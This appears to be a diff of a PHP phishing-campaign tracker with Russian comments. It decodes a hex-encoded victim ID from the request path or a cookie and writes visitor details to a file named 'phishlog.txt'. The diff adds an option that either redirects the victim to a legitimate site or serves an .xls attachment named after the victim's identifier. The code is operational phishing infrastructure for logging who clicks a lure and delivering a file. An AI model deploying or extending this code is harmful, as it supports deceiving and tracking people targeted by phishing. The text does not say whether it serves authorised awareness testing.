@@ -1,16 +1,35 @@
 <?php
 # Отельное спасибо dinimus :D
 ############### SETTINGS ###############
-$LOGFILE = 'topsecret/phishlog.txt';
-$URLRedirect = 'https://somesite.ru';
+$LOGFILE = '../../topsecret/phishlog.txt';
+$URLRedirect = 'https://yandex.ru';
 $CodedParamName = 'userid';
-$ResultMarker = 'blablabla';
+$ResultMarker = 'download';
+$AttachmentLocation = '../../topsecret/test.xls';
+$AttachmentPrefix = 'dmsterms_';
 ########################################
 function exceptions_error_handler($severity, $message, $filename, $lineno) {
     throw new ErrorException($message, 0, $severity, $filename, $lineno);
 }
+
+function answer($name, $URLRedirect, $AttachmentLocation, $AttachmentPrefix, $Identity) {
+  if ($name == "redirect") {
+    header("Location: $URLRedirect"); 
+  } elseif ($name == "file") {
+    header($_SERVER["SERVER_PROTOCOL"] . " 200 OK");
+    header("Cache-Control: public"); // needed for internet explorer
+    header("Content-Type: application/xls");
+    header("Content-Transfer-Encoding: Binary");
+    header("Content-Length:".filesize($AttachmentLocation));
+    header("Content-Disposition: attachment; filename=".$AttachmentPrefix.$Identity.".xls");
+    readfile($AttachmentLocation);
+    die();
+  }
+}
+
 set_error_handler('exceptions_error_handler');
 
+$Identity = '';
 $DehexDict = array();
 $ErrorDict = array();
 $LOG = '';
@@ -41,6 +60,7 @@ if (basename(dirname($requri)) == $CodedParamName) {
 
 foreach ($_COOKIE as $key => $value) {
 if ($key == $CodedParamName) {
+    $Identity = $value;
     try {
         $dehex = hex2bin($value);
         if (!empty($dehex)) {
@@ -99,6 +119,8 @@ foreach($ErrorDict as $value) {
 $LOG .= "--------------------------------------\n\r";
 @file_put_contents($LOGFILE, $LOG, FILE_APPEND);
 
-header("Location: $URLRedirect");
+# Вернуть перенаправление или файл
+answer("redirect", $URLRedirect, $AttachmentLocation, $AttachmentPrefix, $Identity);
+#answer("file", $URLRedirect, $AttachmentLocation, $AttachmentPrefix, $Identity);
 #exit;
 ?>
